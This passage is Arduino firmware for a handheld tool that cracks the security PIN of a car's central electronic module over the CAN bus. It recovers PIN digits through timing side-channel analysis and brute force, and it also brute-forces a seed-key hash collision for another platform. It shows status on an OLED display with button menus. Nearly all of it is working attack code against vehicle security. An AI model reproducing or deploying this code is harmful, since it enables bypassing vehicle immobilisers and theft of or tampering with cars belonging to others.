    printf("Average latency: %u\n", cem_reply_avg);

    for (k = 0; k < cem_reply_max - cem_reply_min; k++)
    {
      if (histogram[k] != 0)
      {
        printf("%4u : %5u\n", k + cem_reply_min, histogram[k]);
      }
    }
#endif
  }

  /* sort the collected sequence of latencies */

  qsort(sequence, 100, sizeof(sequence_t), seq_max_lat);

  /* print the top 25 latencies and their PIN value */
  printf("best candidates ordered by latency:\n");
  for (uint32_t i = 0; i < 5; i++)
  {
    printf("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }
  printf("...\n");
  for (uint32_t i = 95; i < 100; i++)
  {
    printf("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }
  double lat_k_0_1 = 100.0 * (sequence[0].latency - sequence[1].latency) / sequence[1].latency;
  double lat_k_98_99 = 100.0 * (sequence[98].latency - sequence[99].latency) / sequence[99].latency;
  double lat_k_0_99 = 100.0 * (sequence[0].latency - sequence[99].latency) / sequence[99].latency;

  /* set the digit in the overall PIN */

  pin[pos] = sequence[0].pinValue;
  pin[pos + 1] = 0;
  pin[pos + 2] = 0;

  qsort(sequence, 100, sizeof(sequence_t), seq_max_std);

  /* print the top 25 latencies and their PIN value */

  printf("\nbest candidates ordered by std:\n");
  for (uint32_t i = 0; i < 5; i++)
  {
    printf("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
  }
  printf("...\n");
  for (uint32_t i = 95; i < 100; i++)
  {
    printf("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
  }
  double std_k_0_1 = 100.0 * (sequence[0].std - sequence[1].std) / sequence[1].std;
  double std_k_98_99 = 100.0 * (sequence[98].std - sequence[99].std) / sequence[99].std;
  double std_k_0_99 = 100.0 * (sequence[0].std - sequence[99].std) / sequence[99].std;

  printf("\nlat_k 0-1 %3.2f%%, lat_k 98-99 %3.2f%%, lat_k 0-99 %3.2f%%\n", lat_k_0_1, lat_k_98_99, lat_k_0_99);
  printf("std_k 0-1 %3.2f%%, std_k 98-99 %3.2f%%, std_k 0-99 %3.2f%%\n", std_k_0_1, std_k_98_99, std_k_0_99);

  if (lat == true)
  {
    printf("pin[%u] choose candidate: %02x (latency only)\n", pos, pin[pos]);
  }
  else
  {
    if (lat_k_0_99 > std_k_0_99)
    {
      printf("Latency has more deviation than STD\n");
      /* choose the PIN value that has the highest latency */
      printf("pin[%u] choose candidate: %02x based on latency\n", pos, pin[pos]);
    }
    else
    {
      printf("STD has more deviation than latency\n");
      if (std_k_0_1 > std_k_98_99)
      {
        printf("STD[0] deviates more than STD[99]\n");
        pin[pos] = sequence[0].pinValue;
      }
      else
      {
        printf("STD[99] deviates more than STD[0]\n");
        pin[pos] = sequence[99].pinValue;
      }
      printf("pin[%u] choose candidate: %02x based on std\n", pos, pin[pos]);
    }
  }

  free(histogram);
}
/*******************************************************************************
 *
 * cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN
 *
 * Returns: N/A
 */

void cemCrackPin(uint32_t maxBytes, bool verbose)
{
  uint8_t pin[PIN_LEN];
  uint8_t pinUsed[PIN_LEN];
  uint32_t start;
  uint32_t end;
  uint32_t percent = 0;
  uint32_t percent_5;
  uint32_t crackRate;
  uint32_t remainingBytes;
  bool cracked = false;
  uint32_t i;

  /* DISPLAY */
  display.clearDisplay();
  display.setCursor(0, 10);
  display.setTextSize(1);
  display.print("Calc bytes: 0-");
  display.print(maxBytes - 1);
  display.setCursor(36, 50);
  display.setTextSize(1);
  display.print("Loading...");
  display.display();

  printf("Calculating bytes 0-%u\n", maxBytes - 1);

  /* profile the CEM to see how fast it can process requests */

  crackRate = profileCemResponse();

  /* start time */

  start = millis();

  /* set the PIN to all zeros */

  memset(pin, 0, sizeof(pin));

  /* try and crack each PIN position */

  for (uint32_t i = 0; i < maxBytes; i++)
  {
    crackPinPosition(pin, i, verbose);
  }

  /* number of PIN bytes remaining to find */

  remainingBytes = PIN_LEN - maxBytes,

  /* show the result of the cracking */
      /* DISPLAY */
      display.clearDisplay();
  display.setCursor(0, 10);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.print("Candidate PIN");
  display.display();
  printf("Candidate PIN ");

  /* show numerial values for the known digits */
  /* DISPLAY */
  display.setCursor(0, 20);
  for (i = 0; i < maxBytes; i++)
  {
    char candidatepin[20];
    sprintf(candidatepin, " %02x ", pin[i]);
    display.print(candidatepin);
    display.display();
    printf("%02x ", pin[i]);
  }

  /* placeholder for the remaining digits */
  /* DISPLAY */
  display.setCursor(6, 30);
  while (i < PIN_LEN)
  {
    display.print("--  ");
    display.display();
    printf("-- ");
    i++;
  }

  printf(": brute forcing bytes %u to %u (%u bytes), will take up to %u seconds\n",
         maxBytes, PIN_LEN - 1, remainingBytes,
         (uint32_t)(pow(100, remainingBytes) / crackRate));

  /* 5% of the remaining PINs to try */

  percent_5 = pow(100, remainingBytes) / 20;

  printf("Progress: ");

  /*
   * Iterate for each of the remaining PIN bytes.
   * Each byte has a value 0-99 so we iterare for 100^remainingBytes values
   */

  for (i = 0; i < pow(100, (remainingBytes)); i++)
  {
    uint32_t pinValues = i;

    /* fill in each of the remaining PIN values */

    for (uint32_t j = maxBytes; j < PIN_LEN; j++)
    {
      pin[j] = binToBcd(pinValues % 100);

      /* shift to the next PIN's value */

      pinValues /= 100;
    }

    /* try and unlock with this PIN */

    if (cemUnlock(pin, pinUsed, NULL, verbose))
    {

      /* the PIN worked, print it and terminate the search */
      display.clearDisplay();
      display.setTextColor(WHITE);
      display.setTextSize(1);
      display.setCursor(0, 10);
      display.print("DONE");
      display.setCursor(0, 20);
      display.print("PIN: ");
      display.setCursor(0, 30);
      char pin[20];
      sprintf(pin, " %02x %02x %02x %02x %02x %02x",
              pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);
      display.print(pin);
      display.display();
      printf("done\n");
      printf("\nfound PIN: %02x %02x %02x %02x %02x %02x",
             pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);

      cracked = true;
      break;
    }

    /* print a periodic progress message */

    if ((i % percent_5) == 0)
    {
      display.fillRect(0, 40, 128, 20, BLACK);
      drawPercentbar(0, 40, 128, 20, p2);
      display.display();
      p2 = p2 + 5;
      if (p2 > 100)
        p2 = 0;
      printf("%u%%..", percent * 5);
      percent++;
    }
  }

  /* print execution summary */

  end = millis();
  printf("\nPIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);

  /* validate the PIN if we were able to crack it */

  if (cracked == true)
  {

    uint8_t data[CAN_MSG_SIZE];
    uint32_t can_id = 0;

    printf("Validating PIN\n");

    /* send the unlock request to the CEM */

    data[0] = CEM_HS_ECU_ID;
    data[1] = 0xBE;
    data[2] = pinUsed[0];
    data[3] = pinUsed[1];
    data[4] = pinUsed[2];
    data[5] = pinUsed[3];
    data[6] = pinUsed[4];
    data[7] = pinUsed[5];

    canMsgSend(CAN_HS, true, 0xffffe, data, verbose);

    /* get the response from the CEM */

    memset(data, 0, sizeof(data));

    canMsgReceive(CAN_HS, &can_id, data, 10, false);

    /* verify the response came from the CEM and is a successful reply to our request */

    if ((can_id == 3) &&
        (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00))
    {
      printf("PIN verified.\n");
    }
    else
    {
      printf("PIN verification failed!\n");
    }
  }
  {
    display.clearDisplay();
    display.setCursor(25, 31);
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.print("PIN NOT FOUND");
    display.display();
  }

  printf("done\n");
}

void can_hs_event(const CAN_message_t &msg)
{
  can_hs_event_msg = msg;
  can_hs_event_msg_available = true;
}

void can_ls_event(const CAN_message_t &msg)
{
  can_ls_event_msg = msg;
  can_ls_event_msg_available = true;
}

void can_ls_init(int baud)
{
  can_ls.begin();
  can_ls.setBaudRate(baud);
  can_ls.enableFIFO();
  can_ls.enableFIFOInterrupt();
  can_ls.setFIFOFilter(ACCEPT_ALL);
  can_ls.onReceive(can_ls_event);
  printf("CAN low-speed init done.\n");
}

void can_hs_init(int baud)
{
  can_hs.begin();
  can_hs.setBaudRate(baud);
  can_hs.enableFIFO();
  can_hs.enableFIFOInterrupt();
  can_hs.setFIFOFilter(ACCEPT_ALL);
  can_hs.onReceive(can_hs_event);
  printf("CAN high-speed init done.\n");
}

/*******************************************************************************
 *
 * ext_output1 - called by FlexCAN_T4's receive interrupt handler
 *
 * Returns: N/A
 */

void ext_output1(const CAN_message_t &msg)
{
  intr = 1;
}

bool find_cem_params(unsigned long pn, struct _cem_params *p)
{
  int i;
  int n = sizeof(cem_params) / sizeof(struct _cem_params);

  printf("Searching P/N %lu in %d known CEMs\n", pn, n);
  for (i = 0; i < n; i++)
  {
    if (cem_params[i].part_number == pn)
    {
      *p = cem_params[i];
      return true;
    }
  }
  return false;
}
void p3_keep_alive(bool verbose)
{
  unsigned char msg[8] = {0x3e, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

  canMsgSend(CAN_HS, false, 0x7df, msg, verbose);
}

void p3_hash(unsigned char *pin, unsigned char *seed, unsigned char *hash)
{
  unsigned int n = 0xc541a9, m = 0x1212050;
  unsigned long long k;
  unsigned char *in = (unsigned char *)&k;
  struct foo
  {
    unsigned int n0 : 4, n1 : 4, n2 : 4, n3 : 4, n4 : 4, n5 : 4, n6 : 4, n7 : 4;
  } *out = (struct foo *)&n;
  int i;

  in[0] = seed[0];
  in[1] = seed[1];
  in[2] = seed[2];
  in[3] = pin[0];
  in[4] = pin[1];
  in[5] = pin[2];
  in[6] = pin[3];
  in[7] = pin[4];

  for (i = 0; i < 64; i++, n >>= 1, k >>= 1)
  {
    if ((n ^ k) & 0x1)
      n ^= m;
  }

  hash[0] = 0x10 * out->n2 + out->n1;
  hash[1] = 0x10 * out->n3 + out->n5;
  hash[2] = 0x10 * out->n0 + out->n4;
}

bool p3_cem_get_seed(unsigned char *seed, bool verbose)
{
  unsigned char req[8] = {0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
  unsigned char msg[8];
  bool ret = true;
  uint32_t id;

again:
  do
  {
    while (canMsgReceive(CAN_HS, NULL, NULL, 0, false))
      ;
    if (!ret)
    {
      delay(1000);
    }
    canMsgSend(CAN_HS, false, 0x726, req, verbose);
    id = 0xff;
    memset(msg, 0xff, sizeof(msg));
    ret = canMsgReceive(CAN_HS, &id, msg, 1000, verbose);
  } while (!ret);

  if (ret && id == 0x72e && msg[0] == 0x05 && msg[1] == 0x67 && msg[2] == 0x01)
  {
    memcpy(seed, msg + 3, 3);
    if (seed[0] == 0 && seed[1] == 0 && seed[2] == 0)
      printf("%s: what? seed 0 0 0? ID %x, %02x %02x %02x %02x %02x %02x %02x %02x \n", __func__, id, msg[0], msg[1], msg[2], msg[3], msg[4], msg[5], msg[6], msg[7]);
  }
  else
  {
    printf("%s: what? ID %x, %02x %02x %02x %02x %02x %02x %02x %02x \n", __func__, id, msg[0], msg[1], msg[2], msg[3], msg[4], msg[5], msg[6], msg[7]);
    can_prog_mode();
    ret = false;
    goto again;
  }

  return ret;
}

int p3_cem_send_key(unsigned char *key, bool verbose)
{
  unsigned char req[8] = {0x05, 0x27, 0x02, key[0], key[1], key[2], 0x00, 0x00};
  unsigned char msg[8];
  int ret = -1;
  uint32_t id;

again:
  do
  {
    while (canMsgReceive(CAN_HS, NULL, NULL, 0, false))
      ;
    if (!ret)
    {
      delay(1000);
    }
    canMsgSend(CAN_HS, false, 0x726, req, verbose);
    id = 0xff;
    memset(msg, 0xff, sizeof(msg));
    ret = canMsgReceive(CAN_HS, &id, msg, 1000, verbose);
  } while (!ret);

  if (id == 0x72e && msg[0] == 0x02 && msg[1] == 0x67 && msg[2] == 0x02)
  {
    printf("reply: ");
    for (int i = 0; i < 8; i++)
      printf("%02x ", msg[i]);
    printf("\n");
    ret = 1;
  }
  else if (id == 0x72e && msg[0] == 0x03 && msg[1] == 0x27 && msg[2] == 0x35)
  {
    can_prog_mode();
    goto again;
  }
  else
  {
    ret = 0;
  }

  return ret;
}

void p3_find_hash_collision(unsigned char *_seed, unsigned char *_key)
{
  unsigned char seed[3];
  unsigned char key[3];
  unsigned char pin[5] = {0};
  unsigned int i = 0;
  int ret;
  bool verbose = false;
  unsigned long now, last = TSC, diff;

  for (int p2 = 0; p2 < 0x100; p2++)
  {
    pin[2] = p2;
    for (int p3 = 0; p3 < 0x100; p3++)
    {
      pin[3] = p3;
      for (int p4 = 0; p4 < 0x100; p4++)
      {
        pin[4] = p4;
        if ((p4 % 10) == 0)
        {
          p3_keep_alive(false);
        }
      retry:
        p3_cem_get_seed(seed, verbose);
        p3_hash(pin, seed, key);
        now = TSC;
        diff = (now - last) / (1000 * clockCyclesPerMicrosecond());
        if (verbose || diff >= 1000)
        {
          printf("SEED %02x %02x %02x, PIN %02x %02x %02x %02x %02x, KEY %02x %02x %02x, %d pins/s\n", seed[0], seed[1], seed[2], pin[0], pin[1], pin[2], pin[3], pin[4], key[0], key[1], key[2], i);
          last = now;
          i = 0;
        }
        ret = p3_cem_send_key(key, verbose);
        if (ret > 0)
          goto out;
        else if (ret < 0)
        { // need new seed
          p3_keep_alive(false);
          verbose = true;
          goto retry;
        }
        verbose = false;
        i++;
      }
    }
  }
out:
  printf("hash collision found\n");
  printf("SEED %02x %02x %02x, PIN %02x %02x %02x %02x %02x, KEY %02x %02x %02x, %d pins/s\n", seed[0], seed[1], seed[2], pin[0], pin[1], pin[2], pin[3], pin[4], key[0], key[1], key[2], i);
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setCursor(5, 15);
  char p3buffer[40];
  sprintf(p3buffer, "SEED: %02x %02x %02x\n PIN: %02x %02x %02x %02x %02x\n KEY: %02x %02x %02x\n %d pins/s\n", seed[0], seed[1], seed[2], pin[0], pin[1], pin[2], pin[3], pin[4], key[0], key[1], key[2], i);
  display.print(p3buffer);
  display.display();
  memcpy(_seed, seed, 3);
  memcpy(_key, key, 3);
}

void p3_cem_crack_pin()
{
  unsigned char seed[3];
  unsigned char key[3];

  p3_find_hash_collision(seed, key);
}

bool initialized = false;

/*******************************************************************************
 *
 * setup - Arduino entry point for hardware configuration
 *
 * Returns: N/A
 */

void setup(void)
{
  /* set up the serial port */

  Serial.begin(115200);
  Serial3.begin(10800); /* K-Line */

  delay(3000);

  /* DISPLAY RUN */
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C))
  { // Address 0x3D for 128x64
    Serial.println(F("SSD1306 allocation failed"));
  }
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setCursor(0, 10);
  // Display Logo
  display.drawBitmap(0, 0, logo, 128, 64, WHITE);
  display.display();
  delay(3000);
  pinMode(LOWER_BUTTON, INPUT_PULLUP);
  pinMode(UPPER_BUTTON, INPUT_PULLUP);

  ARM_DEMCR |= ARM_DEMCR_TRCENA;
  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;

  /* set up the pin for sampling the CAN bus */
  pinMode(CAN_L_PIN, INPUT_PULLUP);

  set_arm_clock(180000000);
}
/* enable the time stamp counter */

void restartECM(void)
{
  printf("CPU Maximum Frequency:   %u\n", F_CPU);
  printf("CPU Frequency:           %u\n", F_CPU_ACTUAL);
  printf("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond());
  if (p3)
  {
    printf("Cracking P3\n");
  }

  else
  {
    printf("PIN bytes to measure:    %u\n", CALC_BYTES);
    printf("Number of samples:       %u\n", SAMPLES);
  }

  long pn = 0;

  if (p3)
  {
    can_ls_init(CAN_125KBPS);
    can_hs_init(CAN_500KBPS);
    can_prog_mode();
  }

  else
  {

#if defined(CEM_PN_AUTODETECT)
    can_hs.begin();
    k_line_keep_alive();
    delay(1000);
    can_ls_init(CAN_125KBPS);
    k_line_keep_alive();
    pn = ecu_read_part_number(CAN_LS, CEM_LS_ECU_ID);

    if (!pn)
    { // might be CEM-L
      printf("Can't find part number on CAN-LS, trying CAN-HS at 500 Kbps\n");
      can_hs_init(CAN_500KBPS);
      pn = ecu_read_part_number(CAN_HS, CEM_HS_ECU_ID);
    }
#else
    can_ls_init(CAN_125KBPS);
    can_hs_init(CAN_500KBPS);
    can_prog_mode();
    pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
#endif

    struct _cem_params hs_params;
    if (!pn || !find_cem_params(pn, &hs_params))
    {
      display.clearDisplay();
      display.setCursor(0, 10);
      display.setTextSize(1);
      display.print("RESETING DONE! ");
      display.setCursor(12, 50);
      display.print("Reconnect device!");
      display.display();
      printf("Unknown CEM part number %lu. Don't know what to do.\n", pn);
      progModeOff();
    }
  }
}

void aftersetup(void)
{
  display.clearDisplay();
  display.setCursor(36, 30);
  display.setTextSize(1);
  display.print("Loading...");
  display.display();

  bool hs_inited = false;

  printf("CPU Maximum Frequency:   %u\n", F_CPU);
  printf("CPU Frequency:           %u\n", F_CPU_ACTUAL);
  printf("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond());
  if (p3)
  {
    display.clearDisplay();
    display.setCursor(22, 32);
    display.setTextSize(1);
    display.print("Cracking P3...");
    display.display();
    printf("Cracking P3\n");
  }

  else
  {
    display.clearDisplay();
    display.setCursor(18, 32);
    display.setTextSize(1);
    display.print("Cracking P1/P2...");
    display.display();
    printf("PIN bytes to measure:    %u\n", CALC_BYTES);
    printf("Number of samples:       %u\n", SAMPLES);
  }

  long pn = 0;

  if (p3)
  {
    can_ls_init(CAN_125KBPS);
    can_hs_init(CAN_500KBPS);
    can_prog_mode();
  }

  if (!p3)
  {

#if defined(CEM_PN_AUTODETECT)
    can_hs.begin();
    k_line_keep_alive();
    delay(1000);
    can_ls_init(CAN_125KBPS);
    k_line_keep_alive();
    pn = ecu_read_part_number(CAN_LS, CEM_LS_ECU_ID);

    if (!pn)
    { // might be CEM-L
      printf("Can't find part number on CAN-LS, trying CAN-HS at 500 Kbps\n");
      can_hs_init(CAN_500KBPS);
      hs_inited = true;
      pn = ecu_read_part_number(CAN_HS, CEM_HS_ECU_ID);
    }
#else
    can_ls_init(CAN_125KBPS);
    can_hs_init(CAN_500KBPS);
    can_prog_mode();
    pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
#endif

    struct _cem_params hs_params;
    if (!pn || !find_cem_params(pn, &hs_params))
    {
      display.clearDisplay();
      display.setCursor(12, 10);
      display.setTextSize(1);
      display.print("Unknown CEM");
      display.setCursor(12, 50);
      display.print("Reconnect device!");
      display.display();
      printf("Unknown CEM part number %lu. Don't know what to do.\n", pn);
      return;
    }

    shuffle_order = shuffle_orders[hs_params.shuffle];
    printf("CAN HS baud rate: %d\n", hs_params.baud);
    printf("PIN shuffle order: %d %d %d %d %d %d\n", shuffle_order[0], shuffle_order[1], shuffle_order[2], shuffle_order[3], shuffle_order[4], shuffle_order[5]);

#if defined(CEM_PN_AUTODETECT)
    if (!hs_inited)
      can_hs_init(hs_params.baud);

    can_prog_mode();
    if (!hs_inited)
      pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
#endif
  }
  initialized = true;
  display.clearDisplay();
  display.setCursor(22, 32);
  display.setTextSize(1);
  display.print("Initialization.");
  display.display();
  printf("Initialization done.\n\n");
}

void latmenu(void)
{
  for (;;)
  {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0, 10);
    display.setTextSize(1);
    display.print("Latency only?: ");
    display.drawRect(10, 25, 20, 10, WHITE);
    display.setCursor(45, 25);
    display.print("NO");
    display.drawRect(10, 40, 20, 10, WHITE);
    display.setCursor(45, 40);
    display.print("YES");
    display.display();
    byte progModeButton = digitalRead(UPPER_BUTTON);
    if (progModeButton == LOW)
    {
      display.fillRect(10, 25, 20, 10, WHITE);
      display.display();
      delay(500);
      lat = false;
      p3 = false;
      aftersetup();
      return;
      return;
    }
    byte buttonState = digitalRead(LOWER_BUTTON);
    if (buttonState == LOW)
    {
      display.fillRect(10, 40, 20, 10, WHITE);
      display.display();
      delay(500);
      lat = true;
      ;
      p3 = false;
      aftersetup();
      return;
    }
  }
}

void samplesmenu(void)
{
  for (;;)
  {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0, 10);
    display.setTextSize(1);
    display.print("Number of samples: ");
    display.print(samp);
    display.drawRect(10, 25, 20, 10, WHITE);
    display.setCursor(45, 25);
    display.print("+ 1");
    display.drawRect(10, 40, 20, 10, WHITE);
    display.setCursor(45, 40);
    display.print("ACCEPT");
    display.display();
    byte progModeButton = digitalRead(UPPER_BUTTON);
    if (progModeButton == LOW)
    {
      display.fillRect(10, 25, 20, 10, WHITE);
      display.display();
      samp++; // increment buttonPresses count
      delay(250);
    }
    if (samp == 101)
      samp = 0;
    // rollover every 101 press

    byte buttonState = digitalRead(LOWER_BUTTON);
    if (buttonState == LOW)
    {
      display.fillRect(10, 40, 20, 10, WHITE);
      display.display();
      delay(500);
      latmenu();
      return;
    }
  }
}
void calcbytesmenu(void)
{
  for (;;)
  {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0, 10);
    display.setTextSize(1);
    display.print("PIN bytes to calc: ");
    display.print(nobytes);
    display.drawRect(10, 25, 20, 10, WHITE);
    display.setCursor(45, 25);
    display.print("+ 1");
    display.drawRect(10, 40, 20, 10, WHITE);
    display.setCursor(45, 40);
    display.print("ACCEPT");
    display.display();
    byte progModeButton = digitalRead(UPPER_BUTTON);
    if (progModeButton == LOW)
    {
      display.fillRect(10, 25, 20, 10, WHITE);
      display.display();
      nobytes++; // increment buttonPresses count
      delay(250);
    }
    if (nobytes == 5)
      nobytes = 0;
    // rollover every fourth press

    byte buttonState = digitalRead(LOWER_BUTTON);
    if (buttonState == LOW)
    {
      display.fillRect(10, 40, 20, 10, WHITE);
      display.display();
      delay(500);
      samplesmenu();
      return;
    }
  }
}

void menu(void)
{
  for (;;)
  {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0, 10);
    display.setTextSize(1);
    display.print("Select platform: ");
    display.drawRect(10, 25, 20, 10, WHITE);
    display.setCursor(45, 25);
    display.print(" -> P1 P2");
    display.drawRect(10, 40, 20, 10, WHITE);
    display.setCursor(45, 40);
    display.print(" -> P3");
    display.display();
    byte progModeButton = digitalRead(UPPER_BUTTON);
    if (progModeButton == LOW)
    {
      p3 = false;
      display.fillRect(10, 25, 20, 10, WHITE);
      display.display();
      delay(500);
      calcbytesmenu();
      return;
    }
    // rollover every fourth press
    byte buttonState = digitalRead(LOWER_BUTTON);
    if (buttonState == LOW)
    {
      p3 = true;
      display.fillRect(10, 40, 20, 10, WHITE);
      display.display();
      delay(500);
      aftersetup();
      return;
    }
  }
}

// void testingdisplay()
// {
// }
/*******************************************************************************
 *
 * loop - Arduino main loop
 *
 * Returns: N/A
 */

void loop(void)
{
  byte progModeButton = digitalRead(UPPER_BUTTON);
  if (progModeButton == LOW)
  {
    display.fillRect(10, 25, 20, 10, WHITE);
    display.display();
    delay(500);
    display.clearDisplay();
    display.setCursor(25, 32);
    display.setTextSize(1);
    display.print("RESETTING ECM");
    display.display();
    // testingdisplay();
    restartECM();
  }

  byte buttonState = digitalRead(LOWER_BUTTON);
  if (buttonState == LOW)
  {
    display.fillRect(10, 40, 20, 10, WHITE);
    display.display();
    delay(500);
    menu();

    bool verbose = false;

    if (initialized)
    {

      if (p3)
      {
        p3_cem_crack_pin();
      }
      else
      {
        cemCrackPin(CALC_BYTES, verbose);
      }
    }
    /* exit ECU programming mode */

    progModeOff();

    /* all done, stop */

    for (;;)
    {
    }
  }
  else
  {
    drawPercentbar(0, 20, 100, 15, p2);
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0, 10);
    display.setTextSize(1);
    display.print("Press button to:");
    display.drawRect(10, 25, 20, 10, WHITE);
    display.setCursor(45, 25);
    display.print("RESET ECM");
    display.drawRect(10, 40, 20, 10, WHITE);
    display.setCursor(45, 40);
    display.print("START CRACK");
    display.display();
  }
}
